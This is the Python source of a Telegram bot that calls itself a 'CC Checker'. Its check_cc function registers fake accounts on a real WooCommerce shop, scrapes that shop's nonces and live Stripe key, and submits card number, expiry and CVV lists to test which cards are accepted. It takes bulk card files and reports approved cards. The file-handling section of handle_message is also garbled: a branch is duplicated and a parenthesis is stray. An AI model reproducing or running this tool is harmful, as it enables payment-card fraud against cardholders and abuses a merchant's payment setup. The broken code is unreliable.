import requests
import asyncio
import json
import random
import re
import os
import aiohttp
from fake_useragent import UserAgent
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ChatMemberHandler
import logging
from datetime import datetime

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token
BOT_TOKEN = os.environ.get("BOT_TOKEN")

# Admin IDs (Add your Telegram User ID here)
ADMIN_IDS = [8899843332] 

# Database files
USERS_FILE = "users.json"
CHANNELS_FILE = "channels.json"

def load_data(filename, default):
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            return json.load(f)
    return default

def save_data(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f)

users = load_data(USERS_FILE, [])
channels = load_data(CHANNELS_FILE, [])

# Premium Custom Emojis
text_emojis = [
    "5219899949281453881", "5222472119295684375", "5222108309795908493", "5219672809936006424",
    "5244820603663296299", "5219943216781995020", "5222400230133081714", "5222148368955877900",
    "5246794802560774143", "5220053623211305785", "5220197908342648622", "5222241728659988366",
    "5260424249914435335", "5219901967916084166", "5217890643321300022", "5246863809800318186",
    "5247213725080890199", "5258023599419171861", "5220070652756635426", "5246942081284320100",
    "5220046725493828505", "5303396278179210513", "5276489300207217985", "5294524383279198295",
    "5294096239464295059", "5364174510708764528", "5294527084813626369", "5294017134756636818",
    "5332423642850536254", "5264892613630111886", "5301096984617166561", "5301275719681190738",
    "5310224206732996002", "5377377257356537351"
]

btn_emojis = [
    "6170163662544707658", "6294142703907116473", "6294106669131503002", "6176905893616031802",
    "6091456153462512920", "6176742294016760397", "6293797538860373333", "5318938025361679130",
    "5316657943188349246", "5316971840873177080", "6129812419028982717", "6129705083501293112",
    "6129801569941592173", "6129650399977675538", "6129769198773083022", "6131886699254388574",
    "6129572317472233948", "6129817830687775854", "6129653943325694007", "6129488844782836766",
    "6129891098534877664", "6129625171339778354", "6129782839589214594", "6129771638314523716",
    "6129444065453808638", "6129828611055689014"
]

def te(i, fallback="✨"):
    return f'<tg-emoji emoji-id="{text_emojis[i]}">{fallback}</tg-emoji>'

def be(i, fallback="🔘"):
    return f'<tg-emoji emoji-id="{btn_emojis[i]}">{fallback}</tg-emoji>'

def is_admin(user_id):
    return user_id in ADMIN_IDS

# Statistics
stats = {
    'total': 0,
    'approved': 0,
    'declined': 0,
    'unknown': 0,
    'errors': 0,
    'start_time': datetime.now()
}

# Global variables for processing
processing_cards = []
processing_status = {}
current_message_id = None
current_chat_id = None

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def get_random_info():
    return {"email": f"user{random.randint(100000, 999999)}@gmail.com"}

async def check_cc(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
            
        random_data = await get_random_info()
        email = random_data["email"]
        user = f"user{random.randint(100000, 999999)}"
        
        s = requests.Session()
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }
        response = s.get('https://radio-tecs.com/my-account-2/', headers=headers)
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
        if not nonce:
            return "DECLINED - Failed to get nonce"
            
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }
        data = {
            'username': user,
            'email': email,
            'mailpoet[subscribe_on_register_active]': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://radio-tecs.com/',
            'wc_order_attribution_session_start_time': '2025-08-29 09:50:42',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }
        response = s.post('https://radio-tecs.com/my-account-2/', headers=headers, data=data)
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }
        response = s.get('https://radio-tecs.com/my-account-2/payment-methods/', headers=headers)
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u-0, i',
            'referer': 'https://radio-tecs.com/my-account-2/payment-methods/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }
        response = s.get('https://radio-tecs.com/my-account-2/add-payment-method/', headers=headers)
        pnonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
        if not pnonce:
            return "DECLINED - Failed to get payment nonce"
            
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
            'referrer': 'https://radio-tecs.com',
            'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
            '_stripe_version': '2024-06-20',
        }
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        if response.status_code != 200:
            return f"DECLINED - Stripe Error: {response.status_code}"
        try:
            payment_id = response.json()['id']
        except:
            return "DECLINED - Failed to get payment ID"
            
        headers = {
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=1, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'is_woopay_preflight_check': '0',
            'payment_method': payment_id,
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': pnonce,
        }
        response = s.post('https://radio-tecs.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    return "APPROVED ✅"
                else:
                    error_data = result.get('data', {})
                    if isinstance(error_data, dict) and 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown error')
                    else:
                        error_msg = result.get('data', {}).get('message', 'Unknown error')
                    return f"DECLINED ❌ - {error_msg}"
            except json.JSONDecodeError:
                if response.text.strip() == '0':
                    return "DECLINED ❌ - Nonce failed"
                elif 'error' in response.text.lower():
                    return f"DECLINED ❌ - {response.text}"
                else:
                    return f"UNKNOWN ⚠️ - {response.text}"
        else:
            return f"HTTP Error: {response.status_code}"
    except Exception as e:
        return f"ERROR ⚠️ - {str(e)}"

async def check_force_sub(user_id, bot):
    for channel in channels:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except Exception as e:
            logger.error(f"Error checking channel {channel}: {e}")
            return False
    return True

async def send_force_sub_message(update, context):
    keyboard = []
    row = []
    for i, channel in enumerate(channels):
        try:
            chat = await context.bot.get_chat(channel)
            title = chat.title
            username = chat.username
            url = f"https://t.me/{username}" if username else f"https://t.me/{channel}"
        except:
            title = "Channel"
            url = f"https://t.me/{channel}"
        
        btn_text = f"{be(i % len(btn_emojis), '📢')} Join {title}"
        row.append(InlineKeyboardButton(btn_text, url=url))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
        
    joined_btn_text = f"{be(len(channels) % len(btn_emojis), '✅')} Joined / Verify"
    keyboard.append([InlineKeyboardButton(joined_btn_text, callback_data="verify_join")])
    
    text = f"{te(0, '🔒')} <b>Force Join Required!</b>\n\n{te(1, '👉')} Please join the following channels to use this bot."
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in users:
        users.append(user_id)
        save_data(USERS_FILE, users)
        
    if channels and not await check_force_sub(user_id, context.bot):
        await send_force_sub_message(update, context)
        return

    keyboard = [
        [InlineKeyboardButton(f"{be(0, '📊')} Check CC", callback_data="check_cc"),
         InlineKeyboardButton(f"{be(1, '📈')} Stats", callback_data="stats")],
        [InlineKeyboardButton(f"{be(2, '📁')} Check File", callback_data="check_file"),
         InlineKeyboardButton(f"{be(3, '🔄')} Reset Stats", callback_data="reset_stats")],
        [InlineKeyboardButton(f"{be(4, '❓')} Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        f"{te(0, '✨')} <b>Welcome to CC Checker Bot!</b> {te(1, '✨')}\n\n"
        f"{te(2, '🔍')} <b>I can help you validate credit cards</b>\n"
        f"{te(3, '📌')} <b>Send me cards in this format:</b>\n"
        "<code>5121078835045021|12|2041|111</code>\n\n"
        f"{te(4, '📂')} <b>Or send a .txt file with multiple cards</b>\n"
        f"{te(5, '⚡')} <b>Use /chk to start checking</b>\n\n"
        f"{te(6, '🛠')} <b>Choose an option below:</b>"
    )
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "check_cc":
        await query.edit_message_text(
            f"{te(7, '📝')} <b>Please send me the CC details</b>\n\n"
            "<b>Format:</b> <code>5121078835045021|12|2041|111</code>\n"
            "You can send multiple cards, one per line.\n\n"
            "<i>Send /cancel to stop</i>",
            parse_mode='HTML'
        )
        context.user_data['waiting_for_cc'] = True
    elif query.data == "check_file":
        await query.edit_message_text(
            f"{te(8, '📂')} <b>Please send me a .txt file</b>\n"
            "The file should contain one card per line.\n\n"
            "<b>Format:</b> <code>5121078835045021|12|2041|111</code>\n\n"
            "<i>Send /cancel to stop</i>",
            parse_mode='HTML'
        )
        context.user_data['waiting_for_file'] = True
    elif query.data == "stats":
        await show_stats(update, context)
    elif query.data == "reset_stats":
        await reset_stats(update, context)
    elif query.data == "help":
        await show_help(update, context)
    elif query.data == "back_to_menu":
        await back_to_menu(update, context)
    elif query.data == "verify_join":
        await verify_join_handler(update, context)

async def verify_join_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    if await check_force_sub(user_id, context.bot):
        await query.edit_message_text(
            text=f"{te(2, '🎉')} <b>Welcome!</b>\n\n{te(3, '✨')} You have successfully joined all channels. Enjoy the bot!",
            parse_mode='HTML'
        )
        keyboard = [
            [InlineKeyboardButton(f"{be(0, '📊')} Check CC", callback_data="check_cc"),
             InlineKeyboardButton(f"{be(1, '📈')} Stats", callback_data="stats")],
            [InlineKeyboardButton(f"{be(2, '📁')} Check File", callback_data="check_file"),
             InlineKeyboardButton(f"{be(3, '🔄')} Reset Stats", callback_data="reset_stats")],
            [InlineKeyboardButton(f"{be(4, '❓')} Help", callback_data="help")]
        ]
        await query.message.reply_text(
            f"{te(0, '✨')} <b>Welcome to CC Checker Bot!</b> {te(1, '✨')}\n\n"
            f"{te(6, '🛠')} <b>Choose an option below:</b>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await query.answer("❌ You haven't joined all channels yet!", show_alert=True)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = datetime.now() - stats['start_time']
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    stats_text = (
        f"{te(9, '📊')} <b>━━━━━━ STATISTICS ━━━━━━</b> {te(10, '📊')}\n\n"
   f"{te(11, '🕐')} <b>Uptime:</b> <code>{hours}h {minutes}m</code>\n"
        f"{te(12, '📊')} <b>Total Checked:</b> <code>{stats['total']}</code>\n\n"
        f"{te(13, '✅')} <b>Approved:</b> <code>{stats['approved']}</code>\n"
        f"{te(14, '❌')} <b>Declined:</b> <code>{stats['declined']}</code>\n"
        f"{te(15, '⚠️')} <b>Unknown:</b> <code>{stats['unknown']}</code>\n"
        f"{te(16, '🚫')} <b>Errors:</b> <code>{stats['errors']}</code>\n\n"
    )
    if stats['total'] > 0:
        stats_text += f"{te(17, '📈')} <b>Success Rate:</b> <code>{stats['approved']/stats['total']*100:.1f}%</code>"
    else:
        stats_text += f"{te(17, '📈')} <b>Success Rate:</b> <code>0%</code>"
        
    keyboard = [[InlineKeyboardButton(f"{be(5, '🔄')} Refresh Stats", callback_data="stats")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(stats_text, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await update.message.reply_text(stats_text, parse_mode='HTML', reply_markup=reply_markup)

async def reset_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    stats = {
        'total': 0,
        'approved': 0,
        'declined': 0,
        'unknown': 0,
        'errors': 0,
        'start_time': datetime.now()
    }
    await update.callback_query.edit_message_text(
        f"{te(18, '🔄')} <b>Statistics have been reset!</b> {te(19, '✅')}\n\n"
        "All counters are now at 0.",
        parse_mode='HTML'
    )

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        f"{te(20, '❓')} <b>━━━━━━ HELP ━━━━━━</b> {te(21, '❓')}\n\n"
        f"{te(22, '🤖')} <b>Bot Commands:</b>\n"
        "• <code>/start</code> - Welcome message\n"
        "• <code>/chk</code> - Start checking CCs\n"
        "• <code>/stats</code> - Show statistics\n"
        "• <code>/reset</code> - Reset statistics\n"
        "• <code>/broadcast</code> - Broadcast message (Admin)\n"
        "• <code>/addchannel</code> - Add force sub channel (Admin)\n"
        "• <code>/removechannel</code> - Remove channel (Admin)\n\n"
        f"{te(23, '📝')} <b>CC Format:</b>\n"
        "<code>5121078835045021|12|2041|111</code>\n"
        "(card|month|year|cvv)\n\n"
        f"{te(24, '📂')} <b>File Support:</b>\n"
        "Send a .txt file with cards\n"
        "One card per line\n\n"
        f"{te(25, '⚡')} <b>Tips:</b>\n"
        "• Use inline buttons for quick actions\n"
        "• Check stats to track your progress\n"
        "• Send /cancel to stop any operation"
    )
    keyboard = [[InlineKeyboardButton(f"{be(6, '🔙')} Back to Menu", callback_data="back_to_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(help_text, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await update.message.reply_text(help_text, parse_mode='HTML', reply_markup=reply_markup)

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton(f"{be(0, '📊')} Check CC", callback_data="check_cc"),
         InlineKeyboardButton(f"{be(1, '📈')} Stats", callback_data="stats")],
        [InlineKeyboardButton(f"{be(2, '📁')} Check File", callback_data="check_file"),
         InlineKeyboardButton(f"{be(3, '🔄')} Reset Stats", callback_data="reset_stats")],
        [InlineKeyboardButton(f"{be(4, '❓')} Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        f"{te(0, '✨')} <b>Welcome to CC Checker Bot!</b> {te(1, '✨')}\n\n"
        f"{te(6, '🛠')} <b>Choose an option below:</b>",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    if update.message.text and update.message.text.lower() == '/cancel':
        context.user_data.clear()
        await update.message.reply_text(
            "❌ <b>Operation cancelled!</b>\n"
            "Use /start to begin again.",
            parse_mode='HTML'
        )
        return
        
    if context.user_data.get('awaiting_broadcast'):
        await handle_broadcast_message(update, context)
        return

    if context.user_data.get('waiting_for_cc'):
        text = update.message.text.strip()
        lines = text.split('\n')
        valid_cards = []
        for line in lines:
            if line.strip():
                if '|' in line and len(line.split('|')) == 4:
                    valid_cards.append(line.strip())
                else:
                    await update.message.reply_text(
                        f"❌ <b>Invalid format:</b> <code>{line}</code>\n"
                        f"Please use: <code>5121078835045021|12|2041|111</code>",
                        parse_mode='HTML'
                    )
                    return
        if valid_cards:
            context.user_data['waiting_for_cc'] = False
            await process_cards(update, context, valid_cards)
        else:
            await update.message.reply_text(
                "❌ <b>No valid cards found!</b>\n"
                "Please send cards in the correct format.",
                parse_mode='HTML'
            )
        # Handle file upload
        if context.user_data.get('waiting_for_file'):
            if update.message.document:
                file = await update.message.document.get_file()
                file_content = await file.download_as_bytearray()
                text = file_content.decode('utf-8')
                lines = text.split('\n')
                valid_cards = []
                for line in lines:
                    if line.strip():
                        if '|' in line and len(line.split('|')) == 4:
                            valid_cards.append(line.strip())
                
                if valid_cards:
                    context.user_data['waiting_for_file'] = False
                    await process_cards(update, context, valid_cards)
                else:
                    await update.message.reply_text(
                        "❌ *No valid cards found in file!*\n"
                        "Each line should be in format: `5121078835045021|12|2041|111`",
                        parse_mode='Markdown'
                    )
            else:
                await update.message.reply_text(
                    "❌ *Please send a text file!*\n"
                    "Use /cancel to stop.",
                    parse_mode='Markdown'
                )
            return
                )
        else:
            await update.message.reply_text(
                "❌ <b>Please send a text file!</b>\n"
                "Use /cancel to stop.",
                parse_mode='HTML'
            )
        return

    if update.message.text and update.message.text.startswith('/chk'):
        await start_check(update, context)
        return

    if update.message.text and not update.message.text.startswith('/'):
        await update.message.reply_text(
            "❓ <b>Unknown command or format</b>\n\n"
            "Use /start to see available options\n"
            "Or send cards in format:\n"
            "<code>5121078835045021|12|2041|111</code>",
            parse_mode='HTML'
        )

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(f"{be(7, '📝')} Enter Cards", callback_data="check_cc"),
         InlineKeyboardButton(f"{be(8, '📁')} Upload File", callback_data="check_file")],
        [InlineKeyboardButton(f"{be(9, '🔙')} Back", callback_data="back_to_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"{te(2, '🔍')} <b>Start CC Checking</b>\n\n"
        "Choose how you want to provide the cards:\n\n"
        f"{te(7, '📝')} <b>Option 1:</b> Enter cards manually\n"
        f"{te(8, '📁')} <b>Option 2:</b> Upload a .txt file\n\n"
        "<i>Each card should be in format:</i>\n"
        "<code>5121078835045021|12|2041|111</code>",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def process_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards):
    global processing_cards, processing_status, current_message_id, current_chat_id
    processing_cards = cards
    processing_status = {}
    current_chat_id = update.effective_chat.id
    
    progress_text = (
        f"{te(26, '🔄')} <b>Processing Cards</b>\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n\n"
        f"{te(27, '📊')} <b>Total:</b> <code>{len(cards)}</code>\n"
        f"{te(28, '✅')} <b>Approved:</b> <code>0</code>\n"
        f"{te(29, '❌')} <b>Declined:</b> <code>0</code>\n"
        f"{te(30, '⚠️')} <b>Unknown:</b> <code>0</code>\n"
        f"{te(31, '🚫')} <b>Errors:</b> <code>0</code>\n\n"
        f"{te(32, '⏳')} <b>Processing...</b>"
    )
    msg = await update.message.reply_text(progress_text, parse_mode='HTML')
    current_message_id = msg.message_id
    
    async with aiohttp.ClientSession() as session:
        for i, card in enumerate(cards, 1):
            result = await check_cc(card, session)
            processing_status[card] = result
            
            stats['total'] += 1
            if 'APPROVED' in result:
                stats['approved'] += 1
            elif 'DECLINED' in result:
                stats['declined'] += 1
            elif 'ERROR' in result or 'HTTP' in result:
                stats['errors'] += 1
            else:
                stats['unknown'] += 1
                
            progress = int((i / len(cards)) * 10)
            bar = "▰" * progress + "▱" * (10 - progress)
            percentage = int((i / len(cards)) * 100)
            
            progress_text = (
                f"{te(26, '🔄')} <b>Processing Cards</b>\n\n"
                f"{bar} {percentage}%\n\n"
                f"{te(27, '📊')} <b>Total:</b> <code>{len(cards)}</code>\n"
                f"{te(28, '✅')} <b>Approved:</b> <code>{stats['approved']}</code>\n"
                f"{te(29, '❌')} <b>Declined:</b> <code>{stats['declined']}</code>\n"
                f"{te(30, '⚠️')} <b>Unknown:</b> <code>{stats['unknown']}</code>\n"
                f"{te(31, '🚫')} <b>Errors:</b> <code>{stats['errors']}</code>\n\n"
                f"{te(32, '⏳')} <b>Processing...</b> <code>{i}/{len(cards)}</code>"
            )
            try:
                await context.bot.edit_message_text(
                    progress_text,
                    chat_id=current_chat_id,
                    message_id=current_message_id,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error updating progress: {e}")
            await asyncio.sleep(0.1)
            
    await show_results(update, context)

async def show_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    approved = []
    declined = []
    unknown = []
    errors = []
    for card, result in processing_status.items():
        if 'APPROVED' in result:
            approved.append((card, result))
        elif 'DECLINED' in result:
            declined.append((card, result))
        elif 'ERROR' in result or 'HTTP' in result:
            errors.append((card, result))
        else:
            unknown.append((card, result))
            
    results_text = (
        f"{te(33, '✅')} <b>━━━━━━ RESULTS ━━━━━━</b> {te(0, '✅')}\n\n"
        f"{te(27, '📊')} <b>Total:</b> <code>{len(processing_cards)}</code>\n"
        f"{te(28, '✅')} <b>Approved:</b> <code>{len(approved)}</code>\n"
        f"{te(29, '❌')} <b>Declined:</b> <code>{len(declined)}</code>\n"
        f"{te(30, '⚠️')} <b>Unknown:</b> <code>{len(unknown)}</code>\n"
        f"{te(31, '🚫')} <b>Errors:</b> <code>{len(errors)}</code>\n\n"
    )
    
    if approved:
        results_text += f"{te(28, '✅')} <b>APPROVED CARDS:</b>\n"
        for card, result in approved[:10]:
            results_text += f"• <code>{card}</code> - {result}\n"
        if len(approved) > 10:
            results_text += f"<i>...and {len(approved)-10} more</i>\n"
        results_text += "\n"
        
    if declined:
        results_text += f"{te(29, '❌')} <b>DECLINED CARDS:</b>\n"
        for card, result in declined[:5]:
            results_text += f"• <code>{card}</code> - {result}\n"
        if len(declined) > 5:
            results_text += f"<i>...and {len(declined)-5} more</i>\n"
            
    keyboard = [
        [InlineKeyboardButton(f"{be(10, '📊')} Check More", callback_data="check_cc"),
         InlineKeyboardButton(f"{be(11, '📈')} Full Stats", callback_data="stats")],
        [InlineKeyboardButton(f"{be(12, '🔙')} Back to Menu", callback_data="back_to_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await context.bot.edit_message_text(
            results_text,
            chat_id=current_chat_id,
            message_id=current_message_id,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error showing results: {e}")
        await context.bot.send_message(
            chat_id=current_chat_id,
            text=results_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        
    processing_cards = []
    processing_status = {}
    current_message_id = None
    current_chat_id = None

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        "❌ <b>Operation cancelled!</b>\n"
        "Use /start to begin again.",
        parse_mode='HTML'
    )
    # --- Admin Commands ---
async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized!")
        return
    if not context.args:
        await update.message.reply_text("Usage: /addchannel <channel_id or @username>")
        return
    
    channel = context.args[0]
    if channel not in channels:
        channels.append(channel)
        save_data(CHANNELS_FILE, channels)
        await update.message.reply_text(f"✅ Added {channel}")
    else:
        await update.message.reply_text("⚠️ Channel already added.")

async def remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized!")
        return
    if not context.args:
        await update.message.reply_text("Usage: /removechannel <channel_id or @username>")
        return
    
    channel = context.args[0]
    if channel in channels:
        channels.remove(channel)
        save_data(CHANNELS_FILE, channels)
        await update.message.reply_text(f"✅ Removed {channel}")
    else:
        await update.message.reply_text("⚠️ Channel not found.")

async def list_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized!")
        return
    if not channels:
        await update.message.reply_text("No channels added.")
        return
    text = "<b>Force Sub Channels:</b>\n" + "\n".join([f"• <code>{c}</code>" for c in channels])
    await update.message.reply_text(text, parse_mode='HTML')

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized!")
        return
    
    await update.message.reply_text(f"{te(4, '📢')} Send the message to broadcast (supports HTML):")
    context.user_data['awaiting_broadcast'] = True

